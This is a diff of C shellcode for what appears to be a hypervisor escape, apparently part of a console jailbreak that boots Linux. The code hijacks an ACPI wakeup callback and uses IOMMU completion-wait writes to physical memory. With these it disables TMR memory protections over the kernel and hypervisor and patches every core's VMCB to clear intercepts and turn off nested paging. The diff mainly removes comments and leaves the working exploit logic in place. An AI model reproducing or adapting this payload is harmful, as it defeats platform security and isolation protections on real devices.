@@ -3,18 +3,12 @@
 #include "utils.h"
 #include <stdint.h>
 
-#define MSR_EFER 0xC0000080
+shellcode_kernel_args args = {0};
 
-shellcode_kernel_args args = {
-    .fw_version = 0xDEADBEEF, .fun_printf = 0x0, .vmcb = {0}};
-
-// We are being called instead of AcpiSetFirmwareWakingVector from
-// acpi_wakeup_machdep
+// We are being called instead of AcpiSetFirmwareWakingVector
 __attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
                                                        uint64_t add2) {
-  // We will do main checks on .text only with a reference to .data to avoid
-  // fixed offsets first After NPTs are disabled, we can continue nornmally
-  // using all the variables in .data that are embedded in shellcode
+  // We will do main checks on .text only with a reference to .data
   volatile shellcode_kernel_args *args_ptr =
       (volatile shellcode_kernel_args
            *)0x11AA11AA11AA11AA; // To be replaced with proper address in .kdata
@@ -54,13 +48,11 @@ __attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
     goto out;
   }
 
-  // Wait for completion
   ret = ((uint64_t(*)(void))args_ptr->fun_hv_iommu_wait_completion)();
 
   if (ret == 0) {
     puts_uart(args_ptr->dmap_base, (char[]){"IOMMU sb OK\n"});
 
-    // Allow R/W on HV and Kernel area
     if (tmr_disable(args_ptr->dmap_base)) {
       puts_uart(args_ptr->dmap_base, (char[]){"TMR X\n"});
       goto out;
@@ -68,7 +60,6 @@ __attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
 
     puts_uart(args_ptr->dmap_base, (char[]){"TMR OK\n"});
 
-    // Patch HV
     patch_vmcb(args_ptr);
 
     puts_uart(args_ptr->dmap_base, (char[]){"VMCB OK\n"});
@@ -89,9 +80,6 @@ __attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
 
     boot_linux();
     printf("Linux prepared OK\n");
-
-    // Activate HV UART - Not really needed but good for debugging
-    // *(uint32_t*)PHYS_TO_DMAP(args.hv_uart_override_pa) = 0x0;
 
     printf("Calling smp_rendezvous to exit all cores to HV with ptr: %016lx\n",
            (uint64_t)vmmcall_dummy);
@@ -120,32 +108,28 @@ void halt(void) { __asm__ __volatile__("hlt"); }
 // Submit a single 16-byte command and wait for completion
 __attribute__((noinline, optimize("O0"))) void
 iommu_submit_cmd(volatile shellcode_kernel_args *args_ptr, uint64_t *cmd) {
-  // Read the offset of current tail of command list
   uint64_t curr_tail = *(
       (uint64_t *)args_ptr->iommu_mmio_va +
       IOMMU_MMIO_CB_TAIL /
-          8); // Offset in IOMMU Command Buffer - Downscale the size of the ptr
+          8);
   uint64_t next_tail = (curr_tail + IOMMU_CMD_ENTRY_SIZE) &
-                       IOMMU_CB_MASK; // Offset in IOMMU Command Buffer
+                       IOMMU_CB_MASK;
 
-  // We write the command in the current empty entry
   uint64_t *cmd_buffer = (uint64_t *)args_ptr->iommu_cb2_va +
-                         curr_tail / 8; // Downscale the size of the ptr
-  // Copy 0x10 bytes (CMD Size)
+                         curr_tail / 8;
+
   cmd_buffer[0] = cmd[0];
   cmd_buffer[1] = cmd[1];
 
-  __asm__ volatile("" : : : "memory"); // Prevent reordering
-  // Indicate the IOMMU that there is a CMD - Downscale the size of the ptr
+  __asm__ volatile("" : : : "memory");
+
   *((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_TAIL / 8) = next_tail;
 
-  // Wait CMD processing completion - Head will be the Tail
   while (*((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_HEAD / 8) !=
          *((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_TAIL / 8))
     ;
 }
 
-// Write 8 bytes to a physical address using IOMMU completion wait store
 __attribute__((noinline, optimize("O0"))) void
 iommu_write8_pa(volatile shellcode_kernel_args *args_ptr, uint64_t pa,
                 uint64_t val) {
@@ -161,21 +145,17 @@ __attribute__((noinline, optimize("O0"))) void
 patch_vmcb(volatile shellcode_kernel_args *args_ptr) {
   for (int i = 0; i < 16; i++) {
     uint64_t pa = args_ptr->vmcb[i];
-    // args_ptr->fun_printf("Patching core: %02d VMCB_PA: 0x%016lx\n", i,
-    // args_ptr->vmcb[i]);
+
     iommu_write8_pa(args_ptr, pa + 0x00,
-                    0x0000000000000000ULL); // Clear all intercepts (R/W) to
-                                            // CR0-CR15 and DR0-DR15
+                    0x0000000000000000ULL);
     iommu_write8_pa(args_ptr, pa + 0x08,
-                    0x0004000000000000ULL); // Clear all intercepts of except.
-                                            // vectors but CPUID
+                    0x0004000000000000ULL);
     iommu_write8_pa(args_ptr, pa + 0x10,
-                    0x000000000000000FULL); // Clear all except VMMCALL, VMLOAD,
-                                            // VMSAVE, VMRUN
+                    0x000000000000000FULL);
     iommu_write8_pa(args_ptr, pa + 0x58,
-                    0x0000000000000001ULL); // Guest ASID ... 1 ?
+                    0x0000000000000001ULL);
     iommu_write8_pa(args_ptr, pa + 0x90,
-                    0x0000000000000000ULL); // Disable NP_ENABLE
+                    0x0000000000000000ULL);
   }
 }
 
@@ -191,8 +171,6 @@ tmr_write(uint64_t dmap, uint32_t addr, uint32_t val) {
   *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_DATA_OFF) = val;
 }
 
-// On 1.xx and 2.xx the HV is embedded in kernel area on TMR 16
-// On 3.xx and 4.xx there are multiple TMR protecting HV and Kernel
 __attribute__((noinline, optimize("O0"))) int tmr_disable(uint64_t dmap) {
   for (int i = 0; i < 24; i++) {
     if (tmr_read(dmap, TMR_CONFIG(i)) != 0) {
